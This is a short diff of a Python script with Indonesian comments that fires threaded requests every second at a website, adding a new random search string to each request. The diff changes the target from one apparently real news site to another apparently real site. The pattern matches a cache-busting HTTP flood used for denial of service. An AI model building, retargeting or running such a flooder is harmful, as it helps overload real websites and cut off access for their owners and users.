@@ -12,7 +12,7 @@ import string
 
 # Daftar URL yang ingin di-curl (parameter s pada url kedua akan diganti dinamis)
 urls = [
-    "https://www.ajnn.net/",
+    "https://pge.id/",
     None  # Placeholder untuk url dinamis
 ]
 
@@ -37,7 +37,7 @@ def run_curl_perdetik():
             # Buat url dinamis untuk parameter q SETIAP request (bukan per detik)
             current_urls = [
                 urls[0],
-                f"https://www.ajnn.net/search/?q={random_string()}"
+                f"https://pge.id/?s={random_string()}"
             ]
             for url in current_urls:
                 t = threading.Thread(target=curl, args=(url,))
